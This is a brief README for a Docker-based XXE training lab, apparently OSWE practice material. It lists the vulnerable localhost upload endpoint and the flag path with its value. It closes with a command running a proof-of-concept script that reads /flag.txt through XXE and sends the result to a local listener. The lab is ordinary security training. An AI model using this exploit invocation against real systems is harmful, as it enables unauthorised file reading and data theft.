# XXE Lab (Docker)

```bash
./labctl.sh up xxe
```

- URL: http://127.0.0.1:8103/upload
- Param: `xml` (POST) or raw body
- Flag: `/flag.txt` → `OSWE{xxe_lab_flag}`

```bash
python3 ../poc.py 127.0.0.1 8103 127.0.0.1 8000 --endpoint /upload --param-name xml --file /flag.txt
```
